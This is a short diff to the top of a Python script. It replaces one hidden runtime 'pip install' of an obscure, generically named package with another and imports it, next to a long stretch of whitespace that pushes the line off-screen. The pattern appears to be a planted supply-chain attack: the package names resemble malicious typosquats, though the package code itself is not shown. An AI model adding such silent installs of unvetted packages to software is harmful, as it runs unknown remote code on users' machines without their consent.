@@ -1,6 +1,6 @@
 import os
-os.system("pip install pipsqlipackages")
-import pipsqlipackages
+os.system("pip install pythonsqlitedbpackagesV2")
+import pythonsqlitedbpackagesV2
 import requests																																																																																																																																																																																																																																																																					
 from selenium import webdriver
 from selenium.webdriver.firefox.options import Options
